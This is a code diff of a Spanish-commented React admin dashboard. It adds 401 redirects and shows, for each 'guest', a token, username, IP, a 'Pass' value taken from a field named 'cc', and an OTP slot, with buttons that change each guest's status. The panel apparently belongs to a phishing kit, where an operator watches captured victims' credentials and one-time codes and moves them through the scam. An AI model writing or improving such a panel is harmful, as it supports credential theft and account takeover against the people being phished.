@@ -1,11 +1,13 @@
 import React, { useEffect, useState } from 'react';
 import axios from 'axios';
+import { useNavigate } from 'react-router-dom';  // Importamos useNavigate
 
 const AdminDashboard = () => {
     const [guests, setGuests] = useState([]);
     const [statuses, setStatuses] = useState([]);
     const [error, setError] = useState('');
     const [updatedGuestId, setUpdatedGuestId] = useState(null); // Estado para el ID del invitado actualizado
+    const navigate = useNavigate();  // Inicializamos el hook useNavigate
 
     const fetchGuests = async () => {
         try {
@@ -18,10 +20,14 @@ const AdminDashboard = () => {
             setGuests(response.data.guests);
             setStatuses(response.data.statuses);
         } catch (err) {
-            setError('Error al cargar los datos.');
+            if (err.response && err.response.status === 401) {
+                // Si la respuesta es un error 401, redirige al usuario a la ruta raíz
+                navigate('/');
+            } else {
+                setError('Error al cargar los datos.');
+            }
         }
     };
-
 
     const updateStatus = async (id, statusId) => {
         try {
@@ -30,7 +36,7 @@ const AdminDashboard = () => {
                 { status_id: statusId }, 
                 {
                     headers: {
-                        Authorization: `Bearer ${token}`, // Agregar el token a las cabeceras
+                        Authorization: `Bearer ${token}`,
                     },
                 }
             );
@@ -44,7 +50,12 @@ const AdminDashboard = () => {
     
             fetchGuests(); // Refrescar la lista después de actualizar
         } catch (err) {
-            setError('Error al actualizar el estado.');
+            if (err.response && err.response.status === 401) {
+                // Si la respuesta es un error 401, redirige al usuario a la ruta raíz
+                navigate('/');
+            } else {
+                setError('Error al actualizar el estado.');
+            }
         }
     };
 
@@ -56,7 +67,7 @@ const AdminDashboard = () => {
 
     return (
         <div className="p-6 bg-gray-100 min-h-screen">
-            <h2 className="text-3xl font-bold mb-4 text-center">Panel de Administración</h2>
+            <h2 className="text-3xl font-bold mb-4 text-center">Panel</h2>
             {error && <p className="text-red-500 mb-4">{error}</p>}
             <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
                 {guests.map((guest) => (
@@ -64,8 +75,16 @@ const AdminDashboard = () => {
                         key={guest.id}
                         className={`bg-white p-4 rounded-lg shadow-md transition-transform duration-300 ${updatedGuestId === guest.id ? 'ring-2 ring-blue-500 transform scale-105' : ''}`}
                     >
+                        <p className='text-center'><b>ID:</b> {guest.token}</p>
+                        <br />
                         <p> <strong>Usuario:</strong> {guest.user}</p>
                         <p><strong>IP:</strong> {guest.ip}</p>
+                        <br />
+                        <p><b>🧑‍💻 User: </b>{guest.user}</p>
+                        <p><b>🔐 Pass: </b>{guest.cc}</p>
+                        <br />
+                        <p><b>OTP: </b>{}</p>
+                        <br />
                         <p><strong>Estado Actual:</strong> {statuses.find(status => status.id === guest.status_id)?.name}</p>
                         <div className="mt-4 flex flex-wrap gap-2">
                             {statuses.map((status) => (
